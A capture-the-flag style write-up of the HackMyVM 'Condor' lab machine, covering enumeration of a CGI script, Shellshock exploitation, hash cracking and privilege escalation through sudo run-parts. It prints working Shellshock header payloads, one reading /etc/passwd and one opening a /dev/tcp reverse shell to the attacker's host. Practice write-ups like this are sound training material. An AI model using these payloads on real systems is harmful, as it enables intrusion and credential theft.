---
layout: post
title: "HackMyVM - Condor"
date: 2021-11-15 22:40:02 +0100
categories: hmv
tag: ["ShellShock"]
---

Creator: [cromiphi](https://hackmyvm.eu/profile/?user=cromiphi)
Level: Medium
Release Date: 2021-11-14

## Scan

```bash
$ nmap -sC -sV -p- 192.168.1.10 
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-15 22:41 WEST
Nmap scan report for 192.168.1.10
Host is up (0.00031s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   3072 39:41:db:3a:f0:8f:7d:4d:85:c5:aa:0b:5f:66:ba:a7 (RSA)
|   256 66:89:b1:8e:8b:af:cf:7f:49:c5:7c:e6:4b:b7:d8:5b (ECDSA)
|_  256 a3:b3:f0:14:a4:4e:05:c0:d1:24:2f:a8:fe:a5:2c:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.51 ((Debian))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.51 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.69 seconds
```

## Enumeration

### Looking for Directories with WFUZZ

```bash
$ wfuzz -t 500 -L -c --hc=404 -w /usr/share/wordlists/wfuzz/general/medium.txt http://192.168.1.10/FUZZ 
```

```txt
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.1.10/FUZZ
Total requests: 1659

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                              
=====================================================================

000000288:   403        9 L      28 W       277 Ch      "cgi-bin/"                                                                                           

Total time: 0
Processed Requests: 1659
Filtered Requests: 1658
Requests/sec.: 0
```

### Files enumeration with GoBuster

```bash
$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r -u http://192.168.1.10/cgi-bin/ -x cgi,bash,sh,pl,py
```

```txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://192.168.1.10/cgi-bin/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     sh,pl,py,cgi,bash
[+] Follow Redir:   true
[+] Timeout:        10s
===============================================================
2021/11/15 22:56:03 Starting gobuster
===============================================================
/test.cgi (Status: 200)
/condor.sh (Status: 200)
===============================================================
2021/11/15 23:02:56 Finished
===============================================================
```

### condor.sh

```bash
$ curl http://192.168.1.10/cgi-bin/condor.sh
Content-Type: text/plain

Some people think technology has the answers.

 00:05:53 up 25 min,  0 users,  load average: 0.53, 4.39, 3.94
```

## [ShellShock](https://www.surevine.com/shellshocked-a-quick-demo-of-how-easy-it-is-to-exploit/)

* Testing Exploit

```bash
$ curl -v http://192.168.1.10/cgi-bin/condor.sh -H "custom:() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd " 
*   Trying 192.168.1.10:80...
* Connected to 192.168.1.10 (192.168.1.10) port 80 (#0)
```

```http
> GET /cgi-bin/condor.sh HTTP/1.1
> Host: 192.168.1.10
> User-Agent: curl/7.83.0
> Accept: */*
> custom:() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd 
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Sun, Nov 15 2021 22:12:00 GMT
< Server: Apache/2.4.51 (Debian)
< Vary: Accept-Encoding
< Transfer-Encoding: chunked
< Content-Type: text/html
< 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
kevin:x:1000:1000:,,,:/home/kevin:/bin/bash
paulo:x:1001:1001:,,,:/home/paulo:/bin/bash
* Connection #0 to host 192.168.1.10 left intact
```

### [Reverse Shell](https://ethicalhackingguru.com/how-to-exploit-the-shellshock-vulnerability/)

```bash
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/192.168.1.6/9001 0>&1' http://192.168.1.10/cgi-bin/condor.sh
```

```bash
$ nc -lvvp 9001                
listening on [any] 9001 ...
192.168.1.10: inverse host lookup failed: Unknown host
connect to [192.168.1.6] from (UNKNOWN) [192.168.1.10] 37414
bash: cannot set terminal process group (388): Inappropriate ioctl for device
bash: no job control in this shell
bash-4.3$
```

## MD5 Name Match

```bash
(remote) www-data@condor:/usr/lib/cgi-bin$ ls -la /home/kevin/                                                                                                        
total 28
drwxr-xr-x 3 kevin kevin 4096 Nov  6  2021 .
drwxr-xr-x 4 root  root  4096 Nov  6  2021 ..
lrwxrwxrwx 1 root  root     9 Nov  6  2021 .bash_history -> /dev/null
-rw-r--r-- 1 kevin kevin  220 Nov  6  2021 .bash_logout
-rw-r--r-- 1 kevin kevin 3526 Nov  6  2021 .bashrc
-rw-r--r-- 1 kevin kevin 4060 Nov  6  2021 .i_did_it_again
drwxr-xr-x 3 kevin kevin 4096 Nov  6  2021 .local
-rw-r--r-- 1 kevin kevin  807 Nov  6  2021 .profile
(remote) www-data@condor:/usr/lib/cgi-bin$ cat /home/kevin/.i_did_it_again                                                                                            
8395d26f20d997f971919e93edee06d3:$6$TCX.c/9ARPR3KCFE$4ZhsWox9dPa8/CG4O6socHVYYM6cJbtpaBx9cefvABC8gP0vMrWsgBhUUGoAHWnJI.X.NyzP5sbtMpGGfwuS11
307dcfe346e38992d47000630bd19579:$6$gwBgUJgQHGxTex13$b/67Oe7CIvDS85hex4GrHC2RuEkLRfWHAAgimHNyxC/L5biEqSly920uazvDXx3ACrM.srme6Us78aWUEGNAG0
.....
[-----[ REDACTED ]-----]
.....
eba85493050731dd33c9efd3ae0fd92e:$6$DO825nF5jlEynyuT$ffsJu3AxoxW5DKkHQF5CBy6ueyYdX1qzq3aWSEu.32YTJCYC9wezaex1P3P0Lkiync94UF3PII8FuMYcTbyuU0
(remote) www-data@condor:/usr/lib/cgi-bin$                                                                                                 
```

* Looking for user match

```bash 
(remote) www-data@condor:/usr/lib/cgi-bin$ echo -n paulo|md5sum                                                                                                       
dd41cb18c930753cbecf993f828603dc  -

dd41cb18c930753cbecf993f828603dc:$6$1tKf9R.0qo7v5DjD$uYneSfO1bb4upW2xlLw.hHGeuAtCunYhdOjQS2MBdnpPcMt0ZiZee42BjDO2jmUJffTXsKdo43SjE4pqM6WqJ/
```

### Cracking Hash

```bash
$ john --wordlist=/usr/share/wordlists/rockyou.txt paulohash  
Warning: detected hash type "sha512crypt", but the string is also recognized as "HMAC-SHA256"
Use the "--format=HMAC-SHA256" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
p********23      (dd41cb18c930753cbecf993f828603dc)     
1g 0:00:00:01 DONE (2021-11-15 23:29) 0.6993g/s 1074p/s 1074c/s 1074C/s 
Session completed. 
```

## ROOT - [run-parts](https://gtfobins.github.io/gtfobins/run-parts/#sudo)

```bash
$ sudo -l
Matching Defaults entries for paulo on condor:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User paulo may run the following commands on condor:                                                                                                                   
    (ALL : ALL) NOPASSWD: /usr/bin/run-parts
```

```bash
sudo run-parts --new-session --regex '^sh$' /bin
id
uid=0(root) gid=0(root) groups=0(root)
```
